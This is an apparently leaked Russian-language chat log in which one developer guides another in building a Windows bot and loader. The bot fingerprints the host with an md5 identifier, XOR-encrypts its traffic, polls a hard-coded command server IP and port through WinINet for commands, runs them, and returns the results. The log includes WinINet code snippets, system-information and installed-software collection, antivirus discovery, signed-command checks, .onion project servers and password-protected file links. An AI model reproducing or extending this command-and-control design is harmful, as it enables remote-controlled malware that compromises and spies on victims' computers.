Timestamp	From	To	Message
2020-07-14 14:07:33.989264	mushroom	price	Это для программ, на эти адреса запросы будешь посылать в программах.
2020-07-14 14:08:39.460182	mushroom	price	базар пока не нужен, используй эти адреса. Когда сделаешь что с этими адресами работает, тогда можно базар адреса прикручивать.
2020-07-14 14:09:02.825521	price	mushroom	то есть посылать на адрес бота, а получать с с другого адреса?
2020-07-14 14:09:19.049812	price	mushroom	пока мне не понятно
2020-07-14 14:09:32.643983	price	mushroom	я думал надо куда-то программу разместиить и запустить
2020-07-14 14:10:04.009486	mushroom	price	Не надо пока размещать программу.
2020-07-14 14:10:41.374517	price	mushroom	а как тогда  "используй эти адреса."
2020-07-14 14:11:02.997821	price	mushroom	на них коннект надо выдать?
2020-07-14 14:11:21.269606	mushroom	price	Программа бот подключается по адресу для бота, посылает запрос как в ТЗ сказано на адрес бота, получает в ответ команду, выполняет, отправляет результат на адрес бота. Всё по протоколу http.
2020-07-14 14:11:40.589442	mushroom	price	Смотри как Wininet работает.
2020-07-14 14:11:43.478842	price	mushroom	и это все с моего компа,  пока
2020-07-14 14:11:58.782387	price	mushroom	это я посмотрел, и работал уже
2020-07-14 14:12:08.780809	mushroom	price	Да. Можешь с виртуальной машины. Как удобно.
2020-07-14 14:13:09.854181	mushroom	price	Сделай это всё для команды 1 (получить информацию о системе).
2020-07-14 14:13:26.593626	mushroom	price	С начала до конца.
2020-07-14 14:14:07.061450	mushroom	price	Команды боту своему на тестовом сервере давай.
2020-07-14 14:14:41.779527	mushroom	price	вкладка bots
2020-07-14 14:14:43.231035	price	mushroom	там типа командной строки есть? я искал ничего не заметил
2020-07-14 14:15:39.542616	mushroom	price	Как только сделаешь как в ТЗ запрос команды, там твой бот появится в списке. И можно будет давать ему команды.
2020-07-14 14:15:52.864822	mushroom	price	Там типа GUI.
2020-07-14 14:19:05.213139	price	mushroom	типа экспортом(стрелочкой в правом углу)?
2020-07-14 14:19:24.659229	mushroom	price	Да.
2020-07-14 14:19:26.625353	price	mushroom	потом в блокноте хтмл ппоявляется и его можно как надо поправить?
2020-07-14 14:20:09.060088	mushroom	price	Там вообще ничего делать не нужно. Бота твоего нету ещё.
2020-07-14 14:20:19.870255	price	mushroom	я на будущее
2020-07-14 14:20:38.102026	price	mushroom	теперь то понятно куда обращаться и он быстро там появится
2020-07-14 14:21:12.523841	mushroom	price	На будущее в списке будет твой бот и справа будет кнопка для того чтобы перейти на вкладку где можно давать команды ему.
2020-07-14 14:21:35.412390	price	mushroom	хорошо
2020-07-14 14:22:17.115242	mushroom	price	Тебе буза сделал на redmine учётную запись и проект, чтобы ты туда писал трудозатраты и что делаешь?
2020-07-14 14:22:39.473910	price	mushroom	думаю, что нет - он мне не говорил
2020-07-14 14:24:05.415476	mushroom	price	Я ему скажу. Начинай делать. Потом ещё сделают тебе на Gitlab учётную запись для проектов твоих.
2020-07-14 14:24:26.270715	price	mushroom	у меня там всё есть
2020-07-14 14:24:39.978311	price	mushroom	это я делал
2020-07-14 14:25:08.036477	mushroom	price	На Gitlab есть уже? Который .onion
2020-07-14 14:25:19.993192	price	mushroom	да
2020-07-14 14:26:29.364169	price	mushroom	(офтопно) я подготовил инструкцию по интеграции гитлаба в студию, если интересует, могу послать
2020-07-14 14:29:02.186348	mushroom	price	Шли.
Для бота сделаешь тогда как я писал выше. Выполнение команды 1, скажешь. Закоммитишь на Gitlab, названия для проектов я скажу.
2020-07-14 14:29:40.486361	price	mushroom	хорошо
2020-07-14 14:34:58.191713	mushroom	price	Избегай использования стандартной библиотеки. Если есть аналог в функции в WinApi используй его. Например вместо memcpy CopyMemory, вместо alloc HeapAlloc, вместо free HeapFree и т.д.
2020-07-14 14:35:26.807009	price	mushroom	ок
2020-07-15 14:47:42.663707	mushroom	price	Не начал делать ещё? У тебя ещё какие проекты есть?
2020-07-15 14:48:15.180966	price	mushroom	начал делать
2020-07-15 14:48:22.465231	price	mushroom	есть проекты в доделке
2020-07-15 14:48:38.171973	price	mushroom	но у меня чтото не подписывает строку программа
2020-07-15 14:48:52.513878	price	mushroom	сегодня часа два её безуспешно отлаживал
2020-07-15 14:49:22.600154	mushroom	price	criptosign которая?
2020-07-15 14:49:26.796426	price	mushroom	говорит что ошибка импорта
2020-07-15 14:50:06.312605	price	mushroom	не может открыть файл, но когда попроще директорию в с:\ делаю, то открывает
2020-07-15 14:50:41.938362	price	mushroom	но потом не может все равно подписать - вываливается уже на собственно подписи
2020-07-15 14:51:00.197520	mushroom	price	Какая программа?
2020-07-15 14:51:28.520214	mushroom	price	Ты про какую говоришь?
2020-07-15 14:51:48.615224	price	mushroom	cryptosign.sln
2020-07-15 14:52:44.584871	mushroom	price	А зачем ты её отлаживаешь. Она тебе не нужна. Из неё надо код проверки подписи взять и вставить в загрузчик и бот.
2020-07-15 14:52:49.926056	price	mushroom	оба ключа делает, но потом на подписи строки не получается
2020-07-15 14:53:09.479360	price	mushroom	я не отлаживаю, просто не подписывает
2020-07-15 14:53:31.441996	mushroom	price	И ключи не надо делать. Я дам тебе ключ.
2020-07-15 14:53:53.827434	price	mushroom	зачем тогда программу высылали?
2020-07-15 14:54:02.547498	price	mushroom	давай ключ
2020-07-15 14:54:30.296937	mushroom	price	Чтобы ты код из неё взял.
2020-07-15 14:54:42.757469	price	mushroom	так код не работает
2020-07-15 14:54:42.758867	price	mushroom	так код не работает
2020-07-15 14:54:54.149565	price	mushroom	или что нужно взять работает?
2020-07-15 14:55:42.725014	price	mushroom	как раз шифрование и не работает
2020-07-15 14:57:12.510765	mushroom	price	Работает.
2020-07-15 14:57:24.701972	mushroom	price	cryptosign.exe --gen pub.key priv.key
2020-07-15 14:57:32.218727	mushroom	price	cryptosign.exe --sign HELLO --bin priv.key
2020-07-15 14:58:07.105615	mushroom	price	cryptosign.exe --verify HELLO pub.key <то что вывела предыдущая команда>
2020-07-15 14:58:13.430169	mushroom	price	Всё работает.
2020-07-15 14:58:30.093940	mushroom	price	Подписал строку HELLO и проверил.
2020-07-15 14:58:33.616208	price	mushroom	    if (!crypter.importKey(keyBlob, keyBlobSize, isPrivate))
    {
        cout << "Import key error" << endl;
        HeapFree(GetProcessHeap(), 0, keyBlob);
        return false;
    }
2020-07-15 14:58:58.406719	price	mushroom	crypter.importKey вываливается
2020-07-15 14:59:34.100395	price	mushroom	--sign "Signed text!!!" --base64 c:\mysign\private.key
2020-07-15 14:59:40.501203	price	mushroom	вот параметры
2020-07-15 15:00:02.904069	price	mushroom	если не близко к корню, то вываливается - не видит файла
2020-07-15 15:00:10.921896	mushroom	price	А ключ ты делал base64?
2020-07-15 15:00:40.239185	mushroom	price	По умолчани ключи делаются как --bin.
2020-07-15 15:00:55.104838	price	mushroom	скорее всего, сейчас точно не помню,  но я из примера брал
2020-07-15 15:01:22.875303	mushroom	price	То что я сверху написал сделай.
2020-07-15 15:01:32.768424	price	mushroom	то есть не 64
2020-07-15 15:01:39.273160	price	mushroom	ок
2020-07-15 15:01:56.220791	mushroom	price	Чтобы base64 надо указать параметр --base64
2020-07-15 15:02:13.288355	mushroom	price	--gen --base64 например
2020-07-15 15:02:38.879751	price	mushroom	у меня всё в батах, и там - cryptosign --gen --base64 private.key public.key
2020-07-15 15:02:41.324040	mushroom	price	По этому и импортировать не может, формат не правильно указан.
2020-07-15 15:03:07.736628	price	mushroom	я поэтому и не помню
2020-07-15 15:03:31.764851	price	mushroom	сейчас переделаю как у тебя
2020-07-15 15:04:11.131112	price	mushroom	ещё у меня наоборот публичный и приватный ключи написаны
2020-07-15 15:04:24.062098	price	mushroom	по сравнению с тобой
2020-07-15 15:05:01.747843	mushroom	price	С base64:
cryptosign.exe --gen --base64 pub.key priv.key
cryptosign.exe --sign HELLO --base64 priv.key
cryptosign.exe --verify HELLO --base64 pub.key <подпись>
2020-07-15 15:05:12.486791	mushroom	price	Сейчас у себя сделал, всё работает.
2020-07-15 15:05:29.797796	price	mushroom	разница только в порядке,  может это и проблема
2020-07-15 15:05:55.061042	mushroom	price	Сгенерировал ключи, подписал, проверил подпись.
2020-07-15 15:06:02.228069	mushroom	price	А у тебя какок порядок?
2020-07-15 15:06:10.610573	price	mushroom	как в инструкции
2020-07-15 15:06:12.105486	price	mushroom	cryptosign --gen --base64 private.key public.key
2020-07-15 15:06:23.876600	mushroom	price	А дальше?
2020-07-15 15:06:38.098820	price	mushroom	cryptosign --sign "Signed text!!!" --base64 private.key
2020-07-15 15:06:49.507378	mushroom	price	И дальше?
2020-07-15 15:07:01.399016	price	mushroom	дальше у меня не идёт
2020-07-15 15:07:14.648025	price	mushroom	
cryptosign --verify "Signed text!!!" --base64 public.key JngHfHcgGcswWP0ZWeaEvzNVLozMbWYtg9EssMD7JdhiLKYg6A50+7cuPSUDs4opnwEPnN1MjPLaQZ8r9mmV71heEhmYkAucTxENmY6X7CTBibsszgUVuxjXBrHKlNT
2020-07-15 15:07:30.587332	mushroom	price	Это подпись
2020-07-15 15:07:32.081545	mushroom	price	JngHfHcgGcswWP0ZWeaEvzNVLozMbWYtg9EssMD7JdhiLKYg6A50+7cuPSUDs4opnwEPnN1MjPLaQZ8r9mmV71heEhmYkAucTxENmY6X7CTBibsszgUVuxjXBrHKlNT
2020-07-15 15:07:43.048459	price	mushroom	кстати в ключах должны стоять CRLF или нет?
2020-07-15 15:07:57.349343	price	mushroom	подпись я собирался из ключа брать
2020-07-15 15:08:05.286178	price	mushroom	ту что я тебе отослал сейчас из примера
2020-07-15 15:08:15.667258	mushroom	price	Вот подпись: JngHfHcgGcswWP0ZWeaEvzNVLozMbWYtg9EssMD7JdhiLKYg6A50+7cuPSUDs4opnwEPnN1MjPLaQZ8r9mmV71heEhmYkAucTxENmY6X7CTBibsszgUVuxjXBrHKlNT
2020-07-15 15:08:35.032393	mushroom	price	Она генерируется всегда.
2020-07-15 15:09:03.314643	price	mushroom	у меня вроде такая же
2020-07-15 15:09:09.932196	mushroom	price	Третью команду сделай.
2020-07-15 15:09:21.826892	mushroom	price	С подписью которую получил на второй команде.
2020-07-15 15:09:40.053931	price	mushroom	хорошо, сейчас сижу делаю
2020-07-15 15:11:05.526468	mushroom	price	Ты README читал для criptosign?
2020-07-15 15:11:31.924032	price	mushroom	конечно, я оттуда примеры брал
2020-07-15 15:13:22.686325	mushroom	price	Ну что проверяет подпись?
2020-07-15 15:14:41.323289	mushroom	price	А как ты из ключа подпись хотел брать?
2020-07-15 15:15:12.239005	mushroom	price	Ключ её генерирует только. А потом проверяет.
2020-07-15 15:15:35.970399	mushroom	price	Приватный генерирует, публичный проверяет.
2020-07-15 15:16:06.726862	mushroom	price	Подпись здесь всегда в формате base64
2020-07-15 15:16:22.561831	mushroom	price	А ключи могут быть как base64 так и просто двоичные.
2020-07-15 15:17:15.307732	price	mushroom	вот получил
2020-07-15 15:17:16.524868	price	mushroom	cryptosign --verify "HELLO" --base64 pub.key JxD62J/VzpE55ZOu0G7dPvBhJT2wJsaP8sHt6PuA/ijYQQFsW+0HwraCcCeZ3q3tEk1gN68dWUhs4b4134xaAgb74DtaxM52zrPu5X49t5AVek3ObZlYAFYWYnTNRFOS
Verified
2020-07-15 15:17:25.566823	price	mushroom	проблема закрыта
2020-07-15 15:17:28.180019	mushroom	price	Прокатило.
2020-07-15 15:17:33.868971	price	mushroom	да
2020-07-15 15:17:47.351452	price	mushroom	фейковая инструкция
2020-07-15 15:18:52.894003	price	mushroom	а с файлами не буду разбирать, хотя странно-у меня не так глубоко директория сидит, и никаких кириллиц нет
2020-07-15 15:19:36.007658	price	mushroom	и путь полный указывал
2020-07-15 15:19:54.924253	mushroom	price	Там формат наверное не тот был.
2020-07-15 15:20:16.787233	mushroom	price	Вот тебе ключ:
Download: https://qaz.im/load/3i6RHF/GQSNkR   
Delete: https://qaz.im/index.php?a=delete&q=1180917199
Пароль: mPJ]u3/Z<4+}S\hG4
2020-07-15 15:20:58.320383	mushroom	price	Прошьёшь в программе как массив байт. Он в двоичном формате. Для проверки подписи даты, которая будет приходить с сервера.
2020-07-15 15:21:01.818743	price	mushroom	в смысле текстовый, а надо бинар? или наоборот?
2020-07-15 15:21:23.358406	mushroom	price	Кто текстовый?
2020-07-15 15:21:45.858589	price	mushroom	понял про формат
2020-07-15 15:22:09.222001	price	mushroom	но он реально createfile вываливал с -1
2020-07-15 15:22:38.624628	mushroom	price	Может он открыт был где.
2020-07-15 15:22:49.099831	price	mushroom	не думаю
2020-07-15 15:22:56.700602	mushroom	price	Надо было GetLastError посмотреть.
2020-07-15 15:23:03.863281	price	mushroom	я имя менял, та же петрушка
2020-07-15 15:23:10.465630	price	mushroom	вот там и смотрел
2020-07-15 15:23:14.687415	price	mushroom	902 чтоли
2020-07-15 15:23:28.566021	price	mushroom	он же в мсдн файла нет
2020-07-15 15:23:47.843811	price	mushroom	ладно забей, дальше двигаемся
2020-07-15 15:24:13.478310	mushroom	price	Сделай команду 1 полностью.
2020-07-15 15:24:38.392762	mushroom	price	На тестовом сервере подписи пока нет. Можешь пока не проверять.
2020-07-15 15:26:14.062325	mushroom	price	Шифрования я давал пример?
2020-07-15 15:26:32.890746	mushroom	price	xor шифрование всего что с сервера и на сервер приходит.
2020-07-15 15:30:56.900161	price	mushroom	Шифрования я давал пример?
2020-07-15 15:30:56.902152	price	mushroom	xor шифрование всего что с сервера и на сервер приходит.
2020-07-15 15:36:41.292289	mushroom	price	[18:26:15] <mushroom> Шифрования я давал пример? 
[18:26:33] <mushroom> xor шифрование всего что с сервера и на сервер приходит.
2020-07-15 15:39:19.551818	price	mushroom	давал
2020-07-15 15:39:32.178905	price	mushroom	SIZE_T Crypter::cryptXor
2020-07-15 15:39:48.461957	mushroom	price	Значит всё есть.
2020-07-15 15:40:50.150200	mushroom	price	Генерируй id как в ТЗ, запрос команды как в ТЗ, на тестовом сервере команду Get System info дай, получи, выполни, отправь результат на сервер.
2020-07-15 15:41:34.513145	mushroom	price	У тебя группа price.
2020-07-15 15:41:40.297944	price	mushroom	да
2020-07-16 09:02:03.595892	price	mushroom	привет
2020-07-16 09:02:33.532574	price	mushroom	подскажи про "Предлагается использовать md5-хэш от строки 
"дата_создания%windir%.имя_компьютера.дата_создания%windir\system32%.имя_домена_или_workgroup""
2020-07-16 09:02:50.929807	price	mushroom	это то, что cryptXor выдаст?
2020-07-16 09:03:15.672431	price	mushroom	и какой key для шифрования?
2020-07-16 09:03:51.963321	price	mushroom	ну и остальное всё, дата_создания - модуля бота?
2020-07-16 09:04:36.744574	price	mushroom	имя_компьютера.дата_создания?
2020-07-16 09:04:51.585104	price	mushroom	windir - c:\windows?
2020-07-16 09:05:07.703847	price	mushroom	тогда что такое windir\system32?
2020-07-16 09:07:29.135212	mushroom	price	windir папка системы, если система в C:\Windows, значит windir\system32 это C:\Windows\System32
2020-07-16 09:08:39.332786	price	mushroom	там не там знак процента стоит
2020-07-16 09:09:12.821378	mushroom	price	Значит опечатка.
2020-07-16 09:09:23.691745	price	mushroom	%windir%\system32  - вот так надо, а в ТЗ %windir\system32%
2020-07-16 09:09:41.483858	price	mushroom	теперь про шифрование и даты создания
2020-07-16 09:09:54.807492	mushroom	price	Опечатка. Папка System32  может быть только в папке системы.
2020-07-16 09:12:04.221466	price	mushroom	шифруется одним байтом или какой-то  ключевой строкой (типа private.key?)?
2020-07-16 09:12:33.996807	price	mushroom	и что там за даты создания?
2020-07-16 09:13:15.814882	mushroom	price	md5-хэш от строки это будет id твоего бота и одновременно ключ для xor шифрования.
2020-07-16 09:13:29.254253	mushroom	price	Даты создания, это дата создания папки Windows.
2020-07-16 09:13:39.641772	price	mushroom	а лучше пример, что я в Get должен послать, чтобы мне сервер ответил, а так он ошибку присылает 404
2020-07-16 09:14:07.790029	price	mushroom	там две даты создания, одни и те же?
2020-07-16 09:15:28.351567	mushroom	price	md5 хеш сделал от строки, это получается массив байт, для xor шифрования подходит, для отправки на сервер это массив байт переводи в хекс строку и посылай типа так GET /<хекс>/2
2020-07-16 09:15:36.579183	price	mushroom	видимо да, поскольку у system32 такая же дата
2020-07-16 09:16:35.943902	mushroom	price	Ты можешь извернуться и дату другую вставить, главное чтобы у бота на определённом компьютере всегда был один и тот же id не зависимо от пользователя, который его запустил.
2020-07-16 09:16:56.479890	mushroom	price	У меня одна и та же дата. С точностью до мсек.
2020-07-20 11:37:48.066391	mushroom	price	Привет Buza сказал что у тебя ест учётная запись на redmine. Он тебе сейчас проект заведёт для загрузчика и бота. Будешь туда писать что делаешь и трудозатраты.
2020-07-20 11:38:07.878127	price	mushroom	хорошо
2020-07-20 11:38:10.353640	mushroom	price	Кстати что делаешь по ним?
2020-07-20 11:38:14.005182	price	mushroom	как зайти на сервер
2020-07-20 11:38:18.386697	price	mushroom	?
2020-07-20 11:38:53.174949	mushroom	price	На какой?
2020-07-20 11:38:58.565544	price	mushroom	я собрал всю информацию о системе, зашифровал и отксорил, но запрос приходит  404
2020-07-20 11:39:17.110669	price	mushroom	после этого - дорога открыта
2020-07-20 11:39:29.984673	price	mushroom			HINTERNET hConnect =
			InternetConnect(
				hInternet,
				TEXT("51.89.125.28"),//<----   IP
				12232,// <----   port on IP       INTERNET_DEFAULT_HTTP_PORT      ->      INTERNET_PORT nServerPort,
				NULL, NULL,//LPCSTR        lpszUserName,LPCSTR        lpszPassword,
				INTERNET_SERVICE_HTTP,//DWORD         dwService,
				0,//DWORD         dwFlags,
				1u//DWORD_PTR     dwContext
			);
2020-07-20 11:39:42.916766	price	mushroom	вот так открываю, нормально
2020-07-20 11:41:19.426847	price	mushroom	а вот что здесь писать?
2020-07-20 11:41:21.095122	price	mushroom				LPCWSTR sget = L"System";
			HINTERNET hRequest =
				HttpOpenRequest(
					hConnect,
					TEXT("GET"),
					sget,
					NULL,
					NULL,
					0,
					INTERNET_FLAG_KEEP_CONNECTION,
					1);
2020-07-20 11:41:27.120556	mushroom	price	По шагам скажи. Как делаешь полный цыкл выполнения команды. Начиная с того как её запрашиваешь.
2020-07-20 11:41:36.787053	price	mushroom	не помню уже причем тут System
2020-07-20 11:42:17.779161	mushroom	price	Ни при чём её не должно быть.
2020-07-20 11:42:41.386904	mushroom	price	Сначала ты создаешь id для бота?
2020-07-20 11:42:56.477345	mushroom	price	В начале работы программы.
2020-07-20 11:43:16.231398	price	mushroom	InternetOpen -> InternetConnect -> HttpAddRequestHeadersA  for cookies->HttpOpenRequest->InternetReadFile
2020-07-20 11:43:44.875867	price	mushroom	с обычного сайта всё читаю, проблема откуда команда придёт прочитать
2020-07-20 11:43:56.038695	mushroom	price	ВО всех запросах должен быть id.
2020-07-20 11:44:00.950862	price	mushroom	ид создаю
2020-07-20 11:44:10.458116	mushroom	price	И куки с твоей группой.
2020-07-20 11:44:20.914573	price	mushroom	вот посмотри на мою цепочку wininet
2020-07-20 11:44:23.659842	mushroom	price	Покажи запрос команды.
2020-07-20 11:44:28.982264	price	mushroom	какие там должны быть функции
2020-07-20 11:45:49.274705	price	mushroom	я только подготовил формирование ид, вопросы по формату дат создания (или вообще фиолетово и они только для уникальности?)
2020-07-20 11:46:10.952026	price	mushroom	куки с групой - это HttpAddRequestHeadersA
2020-07-20 11:46:29.334400	mushroom	price	Для уникальности. Чтобы один компьютер уникально отличался от другого.
2020-07-20 11:46:33.853963	price	mushroom	нормально завершается но не понятно куда её монтировать
2020-07-20 11:46:44.773164	price	mushroom	то есть формат ИД любой
2020-07-20 11:47:04.501844	price	mushroom	с  проюелами без с расшифровкой дат или числами - всё равно
2020-07-20 11:47:25.261665	price	mushroom	извини у  меня жена с ребёнком на камчатку удлетают
2020-07-20 11:47:29.929671	price	mushroom	я на такси их посажу
2020-07-20 11:47:36.580941	mushroom	price	InternetOpen -> InternetConnect -> httpOpenRequest -> httpSendRequest
2020-07-20 11:47:38.603539	price	mushroom	свяжусь попозже
2020-07-20 11:47:39.923546	mushroom	price	Давай.
2020-07-20 15:02:59.409577	price	mushroom	привет,здесь ещё?
2020-07-20 15:03:24.360803	mushroom	price	Здесь.
2020-07-20 15:04:07.765997	price	mushroom	у нас практически одинаковые цепочки, подскажи в какой функции какие реальные параметры надо поставить
2020-07-20 15:04:49.018452	price	mushroom	кстати, вот так я куки хотел писать
2020-07-20 15:04:50.723750	price	mushroom			char* lpszHeaders = (char*)"Cookie: group=price";
		DWORD dwHeadersLength = strlen(lpszHeaders);
		HttpAddRequestHeadersA(hInternet, lpszHeaders, dwHeadersLength,	HTTP_ADDREQ_FLAG_ADD);
2020-07-20 15:05:17.404824	price	mushroom	№1
2020-07-20 15:05:19.194868	price	mushroom			InternetOpen(
			TEXT("WinInet Communication"),
			INTERNET_OPEN_TYPE_PRECONFIG,
			NULL, NULL,
			0);
2020-07-20 15:05:27.465002	price	mushroom	это просто открываем
2020-07-20 15:05:40.479388	price	mushroom	№2
2020-07-20 15:05:42.184381	price	mushroom			HINTERNET hConnect =
			InternetConnect(
				hInternet,
				TEXT("51.89.125.28"),//<----   IP
				12232,// <----   port on IP       INTERNET_DEFAULT_HTTP_PORT      ->      INTERNET_PORT nServerPort,
				NULL, NULL,//LPCSTR        lpszUserName,LPCSTR        lpszPassword,
				INTERNET_SERVICE_HTTP,//DWORD         dwService,
				0,//DWORD         dwFlags,
				1u//DWORD_PTR     dwContext
			);
2020-07-20 15:06:05.816858	price	mushroom	вот тут правильно?
2020-07-20 15:06:42.697441	mushroom	price	Да правильно.
2020-07-20 15:06:54.761440	mushroom	price	Вот так у меня:
2020-07-20 15:06:56.362101	mushroom	price	internetConnect(g_inet, host, port, NULL, NULL,
        INTERNET_SERVICE_HTTP, 0, 0);
2020-07-20 15:07:20.891282	price	mushroom	ладно
2020-07-20 15:07:26.966615	mushroom	price	Потом:
HINTERNET req = wininet.httpOpenRequest(connection, method, path, _TSTR(TEXT("1.1")), NULL,
        NULL, (isSecure ? INTERNET_FLAG_SECURE : 0) | INTERNET_FLAG_NO_COOKIES, 0);
2020-07-20 15:07:27.631482	price	mushroom	потом я куки ставлю
2020-07-20 15:07:57.692611	mushroom	price	Потом:
httpSendRequest(req, headers, headersLen, body, bodySize)
2020-07-20 15:08:04.784442	price	mushroom	короче напиши как у тебя я также попробую и поставлю уже ИД
2020-07-20 15:08:15.176234	mushroom	price	Куки находятся в headers, headersLen.
2020-07-20 15:08:25.864180	mushroom	price	В ручную в заголовок их пиши.
2020-07-20 15:08:32.167187	price	mushroom	понял
2020-07-20 15:08:43.822897	mushroom	price	Так как ты делаешь сейчас на Windows Server не прокатывает.
2020-07-20 15:09:26.344184	mushroom	price	method это GET, path это /<id сгенерированный>/2
2020-07-20 15:09:39.108623	mushroom	price	Это запрос для получения команды с сервера.
2020-07-20 15:10:07.370617	price	mushroom	слешы реально стоят а внутри всё что ИД?
2020-07-20 15:10:16.126681	mushroom	price	body, bodySize пустые (NULL и 0).
2020-07-20 15:10:23.135307	mushroom	price	Да.
2020-07-20 15:10:26.688065	price	mushroom	ок
2020-07-20 15:11:11.862331	price	mushroom	всё, понятно, спасибо
2020-07-20 15:11:19.108173	price	mushroom	вот ещё
2020-07-20 15:11:51.991244	price	mushroom	я установленные приложения перечислил,их 463, их как передавать?
2020-07-20 15:13:48.393907	mushroom	price	Там всё передаётся в формате url encoded. Я тебе пришлю сейчас пример информации.
2020-07-20 15:14:07.560665	price	mushroom	давай
2020-07-20 15:22:48.730318	mushroom	price	Download: https://qaz.im/load/D2ASba/9zDSYN   
Delete: https://qaz.im/index.php?a=delete&q=329620950
Пароль: D1d+y?&UsOwdAD:1K
2020-07-20 15:23:14.942445	price	mushroom	спасибо
2020-07-20 15:23:17.318837	mushroom	price	Всё что посылаешь на сервер должно быть в в кодировке utf-8.
2020-07-20 15:35:36.289217	mushroom	price	Твой проект в redmine https://mk6gwg6mwnn6if33.onion/projects/bdspider
2020-07-20 15:36:02.544704	price	mushroom	ok
2020-07-20 15:36:04.052216	mushroom	price	Пиши что делаешь там и время. Сам разбей себе на подзадачи свой проект.
2020-07-21 15:23:51.524265	mushroom	price	Привет у тебя в проекте на redmine ничего не написано что ты делал и делаешь.
2020-07-21 15:24:36.866638	price	mushroom	так делаю же, кстати и вопрос
2020-07-21 15:24:49.212377	price	mushroom	всю работу запланировать
2020-07-21 15:24:59.730320	price	mushroom	и как отчитывать каждый день
2020-07-21 15:25:05.374598	price	mushroom	?
2020-07-21 15:25:30.816962	mushroom	price	Каждый день пиши туда что делаешь.
2020-07-21 15:25:48.329133	price	mushroom	антивирус как найти? по реестру?
2020-07-21 15:26:26.299080	mushroom	price	Не знаю, я по другому нахожу.
2020-07-21 15:26:31.231892	price	mushroom	то есть с вечера смотрю что надо завтра сделать и пишу вот то-то и то--то а вечером пишу что сделал?
2020-07-21 15:26:45.853415	price	mushroom	понял про АВ
2020-07-21 15:27:47.330895	mushroom	price	Просто задачи себе создаёшь в проекте, ставишь статус в работе, то что делаешь, в конце дня добавил в эту задачу трудозатраты. Сколько её занимался.
2020-07-21 15:28:17.057356	price	mushroom	понял на завтра напишу
2020-07-23 11:18:10.268415	mushroom	price	Привет. Что на данный момент сделал?
2020-07-23 11:18:32.014019	price	mushroom	письмо тебе пишу
2020-07-23 11:18:50.699146	price	mushroom	уперся в получение ответа с сервера
